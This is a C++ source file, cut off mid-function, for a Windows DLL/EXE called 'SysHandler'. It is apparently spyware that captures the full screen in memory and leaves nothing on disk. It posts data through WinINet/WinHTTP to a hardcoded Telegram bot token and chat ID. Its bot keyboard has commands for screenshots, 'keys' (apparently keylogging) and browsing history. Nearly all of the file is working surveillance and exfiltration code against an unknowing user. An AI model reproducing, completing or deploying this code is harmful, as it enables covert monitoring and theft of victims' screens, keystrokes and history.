#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>
#include <objidl.h>
#include <wininet.h>
#include <cstdlib>
#include <cstring>
#include <tlhelp32.h>
#include "sqlite3.h"

#if !defined(SYSHANDLER_BUILD_DLL) && !defined(SYSHANDLER_BUILD_EXE)
#error "Define SYSHANDLER_BUILD_DLL (SysHandler.dll) or SYSHANDLER_BUILD_EXE (SysHandler.exe)"
#endif

#ifdef SYSHANDLER_BUILD_DLL

static const char kBotToken[]  = "8864782602:AAHizrQKt3xkouWSDQlZDfsS_Z5t3DDXaIA";
static const char kBotChatId[] = "8166182163";

static const char kApiBase[] = "https://api.telegram.org";

static bool ProvisionValid()
{
    const char* colon = strchr(kBotToken, ':');
    if (!colon || colon == kBotToken || colon[1] == 0) return false;
    size_t i = (kBotChatId[0] == '-') ? 1 : 0;
    size_t n = strlen(kBotChatId);
    if (n <= i || n > 21) return false;
    for (; i < n; ++i)
        if (kBotChatId[i] < '0' || kBotChatId[i] > '9') return false;
    return true;
}

static void LogLine(const wchar_t*, const wchar_t* msg, DWORD)
{
    OutputDebugStringW(L"[SysHandler] ");
    OutputDebugStringW(msg);
    OutputDebugStringW(L"\r\n");
}

static volatile LONG g_stop       = 0;
static HANDLE        g_thread     = NULL;
static HANDLE        g_singleInst = NULL;
static HMODULE       g_selfModule = NULL;

static ULONG_PTR     g_gdipToken  = 0;
static volatile LONG g_gdipInit   = 0;
static volatile LONG g_gdipReady  = 0;
static HMODULE       g_gdip       = NULL;

typedef int GpStatus;

struct GdiplusStartupInput {
    unsigned int GdiplusVersion;
    void*  DebugEventCallback;
    BOOL   SuppressBackgroundThread;
    BOOL   SuppressExternalCodecs;
};

typedef GpStatus (WINAPI *GdiplusStartupFn)          (ULONG_PTR*, const GdiplusStartupInput*, void*);
typedef GpStatus (WINAPI *GdipCreateBitmapFromDibFn) (const BITMAPINFO*, void*, void**);
typedef GpStatus (WINAPI *GdipSaveImageToStreamFn)   (void*, IStream*, const CLSID*, const void*);
typedef GpStatus (WINAPI *GdipDisposeImageFn)        (void*);

typedef HRESULT (WINAPI *CreateStreamOnHGlobalFn) (HGLOBAL, BOOL, IStream**);

static GdiplusStartupFn          pGdiplusStartup = NULL;
static GdipCreateBitmapFromDibFn pFromDib        = NULL;
static GdipSaveImageToStreamFn   pSaveToStream   = NULL;
static GdipDisposeImageFn        pDisposeImage   = NULL;

static HMODULE                   g_ole32         = NULL;
static CreateStreamOnHGlobalFn   pCreateStreamOnHGlobal = NULL;

static const CLSID kPngEncoderClsid =
    {0x557CF406, 0x1A04, 0x11D3, {0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E}};

static void EnableDpiAwareness()
{
    HMODULE user32 = GetModuleHandleW(L"user32.dll");
    if (!user32) return;
    typedef BOOL (WINAPI *SetProcessDPIAwareFn)(void);
    SetProcessDPIAwareFn f = (SetProcessDPIAwareFn)GetProcAddress(user32, "SetProcessDPIAware");
    if (f) f();
}

static void EnsureGdiplus()
{
    if (g_gdipReady) return;
    if (InterlockedCompareExchange(&g_gdipInit, 1, 0) != 0)
        return;

    g_gdip = LoadLibraryW(L"gdiplus.dll");
    if (!g_gdip)
    {
        InterlockedExchange(&g_gdipInit, 0);
        LogLine(L"dll", L"GDI+ init failed: cannot load gdiplus.dll", 0);
        return;
    }

    pGdiplusStartup = (GdiplusStartupFn)          GetProcAddress(g_gdip, "GdiplusStartup");
    pFromDib        = (GdipCreateBitmapFromDibFn) GetProcAddress(g_gdip, "GdipCreateBitmapFromGdiDib");
    pSaveToStream   = (GdipSaveImageToStreamFn)   GetProcAddress(g_gdip, "GdipSaveImageToStream");
    pDisposeImage   = (GdipDisposeImageFn)        GetProcAddress(g_gdip, "GdipDisposeImage");

    if (!pGdiplusStartup || !pFromDib || !pSaveToStream || !pDisposeImage)
    {
        InterlockedExchange(&g_gdipInit, 0);
        LogLine(L"dll", L"GDI+ init failed: flat API entry point missing", 0);
        return;
    }

    g_ole32 = LoadLibraryW(L"ole32.dll");
    if (!g_ole32)
    {
        InterlockedExchange(&g_gdipInit, 0);
        LogLine(L"dll", L"GDI+ init failed: cannot load ole32.dll", 0);
        return;
    }
    pCreateStreamOnHGlobal =
        (CreateStreamOnHGlobalFn)GetProcAddress(g_ole32, "CreateStreamOnHGlobal");
    if (!pCreateStreamOnHGlobal)
    {
        InterlockedExchange(&g_gdipInit, 0);
        LogLine(L"dll", L"ole32: CreateStreamOnHGlobal entry point missing", 0);
        return;
    }

    GdiplusStartupInput input;
    input.GdiplusVersion           = 1;
    input.DebugEventCallback       = NULL;
    input.SuppressBackgroundThread = FALSE;
    input.SuppressExternalCodecs   = FALSE;

    GpStatus st = pGdiplusStartup(&g_gdipToken, &input, NULL);
    if (st != 0)
    {
        InterlockedExchange(&g_gdipInit, 0);
        LogLine(L"dll", L"GdiplusStartup failed", 0);
        return;
    }
    g_gdipReady = 1;
}

static bool CaptureScreenToMemory(unsigned char** pngOut, DWORD* pngLenOut)
{
    *pngOut = NULL;
    *pngLenOut = 0;

    EnsureGdiplus();
    if (!pFromDib || !pSaveToStream || !pCreateStreamOnHGlobal)
    {
        LogLine(L"dll", L"capture aborted: GDI+/ole32 unavailable", 0);
        return false;
    }

    const int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    const int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    const int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    const int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (vw <= 0 || vh <= 0 || vw > 16384 || vh > 16384)
    {
        LogLine(L"dll", L"capture aborted: bad virtual screen metrics", 0);
        return false;
    }

    HDC screenDc = GetDC(NULL);
    HDC memDc    = CreateCompatibleDC(screenDc);
    if (!screenDc || !memDc)
    {
        if (memDc)    DeleteDC(memDc);
        if (screenDc) ReleaseDC(NULL, screenDc);
        LogLine(L"dll", L"capture aborted: GetDC/CreateCompatibleDC failed", 0);
        return false;
    }

    BITMAPINFO bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth       = vw;
    bi.bmiHeader.biHeight      = -vh;
    bi.bmiHeader.biPlanes      = 1;
    bi.bmiHeader.biBitCount    = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    void*  bits = NULL;
    HBITMAP dib = CreateDIBSection(screenDc, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!dib || !bits)
    {
        if (dib) DeleteObject(dib);
        DeleteDC(memDc);
        ReleaseDC(NULL, screenDc);
        LogLine(L"dll", L"capture aborted: CreateDIBSection failed", 0);
        return false;
    }

    HGDIOBJ oldBmp = SelectObject(memDc, dib);

    BitBlt(memDc, 0, 0, vw, vh, screenDc, vx, vy, SRCCOPY | CAPTUREBLT);

    {
        BYTE*  px    = (BYTE*)bits;
        DWORD  total = (DWORD)vw * (DWORD)vh * 4;
        for (DWORD i = 3; i < total; i += 4)
            px[i] = 0xFF;
    }

    bool saved = false;
    void* image = NULL;
    GpStatus stBmp = pFromDib(&bi, bits, &image);
    if (stBmp != 0 || !image)
    {
        LogLine(L"dll", L"GdipCreateBitmapFromGdiDib failed", 0);
    }
    else
    {
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 1);
        IStream* stm = NULL;
        if (!hMem)
        {
            LogLine(L"dll", L"GlobalAlloc failed for the PNG stream", 0);
        }
        else if (FAILED(pCreateStreamOnHGlobal(hMem, FALSE, &stm)) || !stm)
        {
            LogLine(L"dll", L"CreateStreamOnHGlobal failed", 0);
        }
        else
        {
            GpStatus stSave = pSaveToStream(image, stm, &kPngEncoderClsid, NULL);
            if (stSave != 0)
            {
                LogLine(L"dll", L"GdipSaveImageToStream failed", 0);
            }
            else
            {
                STATSTG stat;
                SIZE_T  cb = 0;
                if (SUCCEEDED(stm->Stat(&stat, STATFLAG_NONAME)))
                    cb = (SIZE_T)stat.cbSize.QuadPart;
                BYTE* raw = (BYTE*)GlobalLock(hMem);
                if (raw && cb > 8 && cb <= 0x4000000)
                {
                    unsigned char* copy = (unsigned char*)malloc((size_t)cb);
                    if (copy)
                    {
                        memcpy(copy, raw, (size_t)cb);
                        *pngOut    = copy;
                        *pngLenOut = (DWORD)cb;
                        saved = true;
                        LogLine(L"dll", L"PNG encoded in RAM (nothing on disk)", 0);
                    }
                    else
                        LogLine(L"dll", L"out of memory copying the PNG", 0);
                }
                else
                    LogLine(L"dll", L"PNG stream empty or unreadable", 0);
                if (raw) GlobalUnlock(hMem);
            }
            stm->Release();
        }
        if (hMem) GlobalFree(hMem);
    }
    if (image) pDisposeImage(image);

    SelectObject(memDc, oldBmp);
    DeleteObject(dib);
    DeleteDC(memDc);
    ReleaseDC(NULL, screenDc);
    return saved;
}

static const char kMultipartBnd[] = "SysHandlerFormBoundary7d1a3f9b2c";

#ifndef INTERNET_OPTION_SECURE_PROTOCOL_LEVEL
#define INTERNET_OPTION_SECURE_PROTOCOL_LEVEL 103
#endif
#ifndef WINHTTP_OPTION_SECURE_PROTOCOLS
#define WINHTTP_OPTION_SECURE_PROTOCOLS      84
#endif
#ifndef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2
#define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2  0x00000800
#endif
#ifndef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3
#define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3  0x00002000
#endif
#ifndef WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY
#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY  4
#ifndef WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY    0
#endif
#endif
#ifndef WINHTTP_FLAG_SECURE
#define WINHTTP_FLAG_SECURE                  0x00800000
#endif
#ifndef WINHTTP_QUERY_STATUS_CODE
#define WINHTTP_QUERY_STATUS_CODE            19
#endif
#ifndef WINHTTP_QUERY_FLAG_NUMBER
#define WINHTTP_QUERY_FLAG_NUMBER            0x20000000
#endif
#ifndef WINHTTP_NO_PROXY_NAME
#define WINHTTP_NO_PROXY_NAME                NULL
#endif
#ifndef WINHTTP_NO_PROXY_BYPASS
#define WINHTTP_NO_PROXY_BYPASS              NULL
#endif
#ifndef WINHTTP_NO_REFERER
#define WINHTTP_NO_REFERER                   NULL
#endif
#ifndef WINHTTP_DEFAULT_ACCEPT_TYPES
#define WINHTTP_DEFAULT_ACCEPT_TYPES         NULL
#endif
#ifndef WINHTTP_HEADER_NAME_BY_INDEX
#define WINHTTP_HEADER_NAME_BY_INDEX         NULL
#endif
#ifndef WINHTTP_NO_HEADER_INDEX
#define WINHTTP_NO_HEADER_INDEX              NULL
#endif
#ifndef INTERNET_FLAG_SECURE_PROTOCOL_TLS1_2
#define INTERNET_FLAG_SECURE_PROTOCOL_TLS1_2  0x00000800
#endif
#ifndef INTERNET_FLAG_SECURE_PROTOCOL_TLS1_3
#define INTERNET_FLAG_SECURE_PROTOCOL_TLS1_3  0x00002000
#endif
#ifndef INTERNET_OPTION_CONNECT_TIMEOUT
#define INTERNET_OPTION_CONNECT_TIMEOUT   2
#endif
#ifndef INTERNET_OPTION_SEND_TIMEOUT
#define INTERNET_OPTION_SEND_TIMEOUT      5
#endif
#ifndef INTERNET_OPTION_RECEIVE_TIMEOUT
#define INTERNET_OPTION_RECEIVE_TIMEOUT   6
#endif
#ifndef INTERNET_FLAG_NO_COOKIES
#define INTERNET_FLAG_NO_COOKIES         0x00080000
#endif

static void PercentEncode(char* out, size_t cch, const char* src)
{
    static const char hex[] = "0123456789ABCDEF";
    size_t o = 0;
    for (; *src && o + 4 < cch; ++src)
    {
        unsigned char c = (unsigned char)*src;
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~')
            out[o++] = (char)c;
        else
        {
            out[o++] = '%';
            out[o++] = hex[c >> 4];
            out[o++] = hex[c & 0xF];
        }
    }
    out[o] = 0;
}

static const char* JsonAfterKey(const char* json, const char* key)
{
    char pat[48];
    wsprintfA(pat, "\"%s\"", key);
    size_t plen = strlen(pat);
    const char* p = json;
    while ((p = strstr(p, pat)) != NULL)
    {
        const char* q = p + plen;
        while (*q == ' ' || *q == '\t') ++q;
        if (*q == ':') return q + 1;
        p = q;
    }
    return NULL;
}

static bool JsonGetString(const char* json, const char* key, char* out, size_t cch)
{
    const char* p = JsonAfterKey(json, key);
    if (!p || *p != '"') return false;
    ++p;
    size_t o = 0;
    while (*p && *p != '"' && o + 5 < cch)
    {
        if (*p != '\\') { out[o++] = *p++; continue; }
        ++p;
        switch (*p)
        {
        case '"':  out[o++] = '"';  ++p; break;
        case '\\': out[o++] = '\\'; ++p; break;
        case '/':  out[o++] = '/';  ++p; break;
        case 'n':  out[o++] = '\n'; ++p; break;
        case 'r':  out[o++] = '\r'; ++p; break;
        case 't':  out[o++] = '\t'; ++p; break;
        case 'b':  out[o++] = 8;    ++p; break;
        case 'f':  out[o++] = 12;   ++p; break;
        case 'u':
        {
            unsigned cp = 0;
            for (int i = 1; i <= 4 && p[i]; ++i)
            {
                char c = p[i];
                cp <<= 4;
                if      (c >= '0' && c <= '9') cp |= (unsigned)(c - '0');
                else if (c >= 'a' && c <= 'f') cp |= (unsigned)(c - 'a' + 10);
                else if (c >= 'A' && c <= 'F') cp |= (unsigned)(c - 'A' + 10);
            }
            p += 5;
            if (cp >= 0xD800 && cp <= 0xDBFF && p[0] == '\\' && p[1] == 'u')
            {
                unsigned lo = 0;
                for (int i = 2; i <= 5 && p[i]; ++i)
                {
                    char c = p[i];
                    lo <<= 4;
                    if      (c >= '0' && c <= '9') lo |= (unsigned)(c - '0');
                    else if (c >= 'a' && c <= 'f') lo |= (unsigned)(c - 'a' + 10);
                    else if (c >= 'A' && c <= 'F') lo |= (unsigned)(c - 'A' + 10);
                }
                if (lo >= 0xDC00 && lo <= 0xDFFF)
                {
                    cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00);
                    p += 6;
                }
            }
            if      (cp < 0x80)   { out[o++] = (char)cp; }
            else if (cp < 0x800)  { out[o++] = (char)(0xC0 | (cp >> 6));
                                    out[o++] = (char)(0x80 | (cp & 63)); }
            else if (cp < 0x10000){ out[o++] = (char)(0xE0 | (cp >> 12));
                                    out[o++] = (char)(0x80 | ((cp >> 6) & 63));
                                    out[o++] = (char)(0x80 | (cp & 63)); }
            else                  { out[o++] = (char)(0xF0 | (cp >> 18));
                                    out[o++] = (char)(0x80 | ((cp >> 12) & 63));
                                    out[o++] = (char)(0x80 | ((cp >> 6) & 63));
                                    out[o++] = (char)(0x80 | (cp & 63)); }
            break;
        }
        default: out[o++] = *p; ++p; break;
        }
    }
    out[o] = 0;
    return true;
}

static void SplitBase(const char* base, char* host, size_t hostCch,
                      INTERNET_PORT* portOut, bool* secureOut)
{
    const char* hs = strstr(base, "://");
    if (!hs) { host[0] = 0; return; }
    hs += 3;
    *secureOut = (_strnicmp(base, "https", 5) == 0);
    const char* colon = strchr(hs, ':');
    const char* slash = strchr(hs, '/');
    const char* hostEnd = (colon && (!slash || colon < slash)) ? colon : slash;
    if (!hostEnd) hostEnd = hs + strlen(hs);
    size_t hn = (size_t)(hostEnd - hs);
    if (hn >= hostCch) hn = hostCch - 1;
    memcpy(host, hs, hn);
    host[hn] = 0;
    *portOut = *secureOut ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
    if (colon && (!slash || colon < slash)) *portOut = (INTERNET_PORT)atoi(colon + 1);
}

static bool HttpPostInet(const char* base, const char* path,
                     const char* contentType,
                     const char* body, DWORD bodyLen,
                     char** respOut, DWORD* respLenOut, DWORD* httpStatusOut)
{
    *respOut = NULL; *respLenOut = 0; *httpStatusOut = 0;

    char host[256];
    INTERNET_PORT port = 443;
    bool secure = true;
    SplitBase(base, host, sizeof(host), &port, &secure);
    if (!host[0]) return false;

    HINTERNET hInet = InternetOpenA("SysHandler/16",
                                    INTERNET_OPEN_TYPE_PRECONFIG,
                                    NULL, NULL, 0);
    if (!hInet) return false;

    HINTERNET hConn = InternetConnectA(hInet, host, port, NULL, NULL,
                                       INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return false; }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE |
                  INTERNET_FLAG_NO_COOKIES;
    if (secure) flags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path, "HTTP/1.1",
                                      NULL, NULL, flags, 0);
    if (!hReq)
    { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }

    DWORD tConn = 15000, tSend = 30000, tRecv = 45000;
    InternetSetOptionA(hReq, INTERNET_OPTION_CONNECT_TIMEOUT, &tConn, sizeof(tConn));
    InternetSetOptionA(hReq, INTERNET_OPTION_SEND_TIMEOUT,    &tSend, sizeof(tSend));
    InternetSetOptionA(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &tRecv, sizeof(tRecv));

    char hdr[512];
    wsprintfA(hdr, "Content-Type: %s\r\nUser-Agent: SysHandler/16\r\n", contentType);

    BOOL sent = HttpSendRequestA(hReq, hdr, (DWORD)-1,
                                 (LPVOID)body, bodyLen);
    if (!sent)
    {
        InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet);
        return false;
    }

    DWORD status = 0, sz = sizeof(status);
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                   &status, &sz, NULL);

    size_t cap = 8192, len = 0;
    char* resp = (char*)malloc(cap);
    if (!resp)
    { InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet); return false; }
    for (;;)
    {
        if (len + 4096 > cap)
        {
            if (cap >= 4u * 1024 * 1024) break;
            cap *= 2;
            char* bigger = (char*)realloc(resp, cap);
            if (!bigger) break;
            resp = bigger;
        }
        DWORD got = 0;
        if (!InternetReadFile(hReq, resp + len, 4096, &got) || got == 0) break;
        len += got;
    }
    if (len >= cap) len = cap - 1;
    resp[len] = 0;

    InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet);

    *respOut = resp; *respLenOut = (DWORD)len; *httpStatusOut = status;
    return true;
}

typedef HINTERNET (WINAPI *WinHttpOpenFn)          (LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *WinHttpConnectFn)       (HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *WinHttpOpenRequestFn)   (HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL      (WINAPI *WinHttpSetOptionFn)     (HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL      (WINAPI *WinHttpSetTimeoutsFn)   (HINTERNET, int, int, int, int);
typedef BOOL      (WINAPI *WinHttpSendRequestFn)   (HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *WinHttpReceiveResponseFn)(HINTERNET, LPVOID);
typedef BOOL      (WINAPI *WinHttpQueryHeadersFn)  (HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
typedef BOOL      (WINAPI *WinHttpReadDataFn)      (HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *WinHttpCloseHandleFn)   (HINTERNET);

static HMODULE g_winhttp = NULL;
static WinHttpOpenFn             pWinHttpOpen            = NULL;
static WinHttpConnectFn          pWinHttpConnect         = NULL;
static WinHttpOpenRequestFn      pWinHttpOpenRequest     = NULL;
static WinHttpSetOptionFn        pWinHttpSetOption       = NULL;
static WinHttpSetTimeoutsFn      pWinHttpSetTimeouts     = NULL;
static WinHttpSendRequestFn      pWinHttpSendRequest     = NULL;
static WinHttpReceiveResponseFn  pWinHttpReceiveResponse = NULL;
static WinHttpQueryHeadersFn     pWinHttpQueryHeaders    = NULL;
static WinHttpReadDataFn         pWinHttpReadData        = NULL;
static WinHttpCloseHandleFn      pWinHttpCloseHandle     = NULL;

static void EnsureWinhttp()
{
    if (g_winhttp) return;
    HMODULE m = LoadLibraryW(L"winhttp.dll");
    if (!m) return;
    pWinHttpOpen            = (WinHttpOpenFn)GetProcAddress(m, "WinHttpOpen");
    pWinHttpConnect         = (WinHttpConnectFn)GetProcAddress(m, "WinHttpConnect");
    pWinHttpOpenRequest     = (WinHttpOpenRequestFn)GetProcAddress(m, "WinHttpOpenRequest");
    pWinHttpSetOption       = (WinHttpSetOptionFn)GetProcAddress(m, "WinHttpSetOption");
    pWinHttpSetTimeouts     = (WinHttpSetTimeoutsFn)GetProcAddress(m, "WinHttpSetTimeouts");
    pWinHttpSendRequest     = (WinHttpSendRequestFn)GetProcAddress(m, "WinHttpSendRequest");
    pWinHttpReceiveResponse = (WinHttpReceiveResponseFn)GetProcAddress(m, "WinHttpReceiveResponse");
    pWinHttpQueryHeaders    = (WinHttpQueryHeadersFn)GetProcAddress(m, "WinHttpQueryHeaders");
    pWinHttpReadData        = (WinHttpReadDataFn)GetProcAddress(m, "WinHttpReadData");
    pWinHttpCloseHandle     = (WinHttpCloseHandleFn)GetProcAddress(m, "WinHttpCloseHandle");
    if (!pWinHttpOpen || !pWinHttpConnect || !pWinHttpOpenRequest ||
        !pWinHttpSetOption || !pWinHttpSetTimeouts || !pWinHttpSendRequest ||
        !pWinHttpReceiveResponse || !pWinHttpQueryHeaders || !pWinHttpReadData ||
        !pWinHttpCloseHandle)
    {
        pWinHttpOpen            = NULL;
        pWinHttpConnect         = NULL;
        pWinHttpOpenRequest     = NULL;
        pWinHttpSetOption       = NULL;
        pWinHttpSetTimeouts     = NULL;
        pWinHttpSendRequest     = NULL;
        pWinHttpReceiveResponse = NULL;
        pWinHttpQueryHeaders    = NULL;
        pWinHttpReadData        = NULL;
        pWinHttpCloseHandle     = NULL;
        FreeLibrary(m);
        return;
    }
    g_winhttp = m;
}

static bool HttpPostWinhttp(const char* base, const char* path,
                            const char* contentType,
                            const char* body, DWORD bodyLen,
                            char** respOut, DWORD* respLenOut, DWORD* httpStatusOut)
{
    *respOut = NULL; *respLenOut = 0; *httpStatusOut = 0;

    EnsureWinhttp();
    if (!pWinHttpOpen) return false;

    char host[256];
    INTERNET_PORT port = 443;
    bool secure = true;
    SplitBase(base, host, sizeof(host), &port, &secure);
    if (!host[0]) return false;

    wchar_t whost[256], wpath[1024], whdr[512];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 256);
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 1024);

    static const wchar_t kWa[] = L"SysHandler/16";
    HINTERNET hSes = pWinHttpOpen(kWa,
                                  WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes)
        hSes = pWinHttpOpen(kWa,
                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return false;

    DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
                  WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    if (!pWinHttpSetOption(hSes, WINHTTP_OPTION_SECURE_PROTOCOLS,
                           &proto, sizeof(proto)))
    {
        DWORD proto12 = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
        pWinHttpSetOption(hSes, WINHTTP_OPTION_SECURE_PROTOCOLS,
                          &proto12, sizeof(proto12));
    }
    pWinHttpSetTimeouts(hSes, 15000, 15000, 30000, 45000);

    HINTERNET hConn = pWinHttpConnect(hSes, whost, port, 0);
    if (!hConn) { pWinHttpCloseHandle(hSes); return false; }

    HINTERNET hReq = pWinHttpOpenRequest(hConn, L"POST", wpath, NULL,
                                         WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,
                                         secure ? WINHTTP_FLAG_SECURE : 0);
    if (!hReq)
    { pWinHttpCloseHandle(hConn); pWinHttpCloseHandle(hSes); return false; }

    wsprintfW(whdr, L"Content-Type: %S\r\nUser-Agent: SysHandler/16\r\n",
              contentType);
    BOOL sent = pWinHttpSendRequest(hReq, whdr, (DWORD)lstrlenW(whdr),
                                    (LPVOID)body, bodyLen, bodyLen, 0);
    if (!sent)
    {
        pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConn); pWinHttpCloseHandle(hSes);
        return false;
    }
    if (!pWinHttpReceiveResponse(hReq, NULL))
    {
        pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConn); pWinHttpCloseHandle(hSes);
        return false;
    }

    DWORD status = 0, sz = sizeof(status);
    pWinHttpQueryHeaders(hReq,
                         WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                         WINHTTP_HEADER_NAME_BY_INDEX,
                         &status, &sz, WINHTTP_NO_HEADER_INDEX);

    size_t cap = 8192, len = 0;
    char* resp = (char*)malloc(cap);
    if (!resp)
    { pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConn); pWinHttpCloseHandle(hSes); return false; }
    for (;;)
    {
        if (len + 4096 > cap)
        {
            if (cap >= 4u * 1024 * 1024) break;
            cap *= 2;
            char* bigger = (char*)realloc(resp, cap);
            if (!bigger) break;
            resp = bigger;
        }
        DWORD got = 0;
        if (!pWinHttpReadData(hReq, resp + len, 4096, &got) || got == 0) break;
        len += got;
    }
    if (len >= cap) len = cap - 1;
    resp[len] = 0;

    pWinHttpCloseHandle(hReq); pWinHttpCloseHandle(hConn); pWinHttpCloseHandle(hSes);

    *respOut = resp; *respLenOut = (DWORD)len; *httpStatusOut = status;
    return true;
}
#ifdef SYSHANDLER_TEST_HOOKS
static CRITICAL_SECTION g_testLogLock;
static LONG g_testLogInit = 0;
static bool TestHttpMock(const char* path, const char* contentType,
                         const char* body, DWORD bodyLen,
                         char** respOut, DWORD* respLenOut, DWORD* httpStatusOut)
{
    if (InterlockedCompareExchange(&g_testLogInit, 1, 0) == 0)
        InitializeCriticalSection(&g_testLogLock);
    EnterCriticalSection(&g_testLogLock);
    HANDLE h = CreateFileA("C:\\tsrc\\http_log.txt",
                           FILE_APPEND_DATA | SYNCHRONIZE, FILE_SHARE_READ,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE)
    {
        char head[512];
        int hn = wsprintfA(head,
                           "=== POST %s\r\nC-T: %s\r\nLEN: %lu\r\nBODY\r\n",
                           path, contentType, (unsigned long)bodyLen);
        DWORD w = 0;
        WriteFile(h, head, (DWORD)hn, &w, NULL);
        if (bodyLen) WriteFile(h, body, bodyLen, &w, NULL);
        WriteFile(h, "\r\nENDBODY\r\n", 11, &w, NULL);
        CloseHandle(h);
    }
    LeaveCriticalSection(&g_testLogLock);
    static const char kResp[] = "{\"ok\":true,\"result\":[]}";
    char* resp = (char*)malloc(sizeof(kResp));
    if (resp) memcpy(resp, kResp, sizeof(kResp));
    *respOut = resp;
    *respLenOut = (DWORD)(sizeof(kResp) - 1);
    *httpStatusOut = 200;
    return true;
}
#endif

static bool HttpPost(const char* base, const char* path,
                     const char* contentType,
                     const char* body, DWORD bodyLen,
                     char** respOut, DWORD* respLenOut, DWORD* httpStatusOut)
{
#ifdef SYSHANDLER_TEST_HOOKS
    if (TestHttpMock(path, contentType, body, bodyLen,
                     respOut, respLenOut, httpStatusOut))
        return true;
#endif
    static int sLeadWinhttp = 0;
    bool ok;
    if (sLeadWinhttp)
    {
        ok = HttpPostWinhttp(base, path, contentType, body, bodyLen,
                             respOut, respLenOut, httpStatusOut);
        if (!ok)
            ok = HttpPostInet(base, path, contentType, body, bodyLen,
                              respOut, respLenOut, httpStatusOut);
        return ok;
    }
    ok = HttpPostInet(base, path, contentType, body, bodyLen,
                      respOut, respLenOut, httpStatusOut);
    if (!ok)
    {
        sLeadWinhttp = 1;
        LogLine(L"dll", L"wininet transport failed - winhttp takes over", 0);
        ok = HttpPostWinhttp(base, path, contentType, body, bodyLen,
                             respOut, respLenOut, httpStatusOut);
    }
    return ok;
}
static void FreeResp(char** resp) { if (*resp) { free(*resp); *resp = NULL; } }

static void TgAnswerCallback(const char* cbId, const char* toast)
{
    if (!cbId || !cbId[0]) return;
    char ecb[160], etoast[160], body[384], path[384];
    PercentEncode(ecb, sizeof(ecb), cbId);
    PercentEncode(etoast, sizeof(etoast), toast ? toast : "");
    lstrcpyA(body, "callback_query_id=");
    lstrcatA(body, ecb);
    if (toast && toast[0])
    {
        lstrcatA(body, "&text=");
        lstrcatA(body, etoast);
    }
    wsprintfA(path, "/bot%s/answerCallbackQuery", kBotToken);
    char* resp = NULL; DWORD len = 0, status = 0;
    HttpPost(kApiBase, path, "application/x-www-form-urlencoded",
             body, (DWORD)strlen(body), &resp, &len, &status);
    if (resp) free(resp);
}

static const char kKbJson[] =
    "{\"inline_keyboard\":[[{\"text\":\"XX\",\"callback_data\":\"shot\"},{\"text\":\"XT\",\"callback_data\":\"screentime\"},{\"text\":\"XK\",\"callback_data\":\"keys\"},{\"text\":\"XH\",\"callback_data\":\"hist\"}]]}";

static void TgSendTextDyn(const char* text, const char* kb)
{
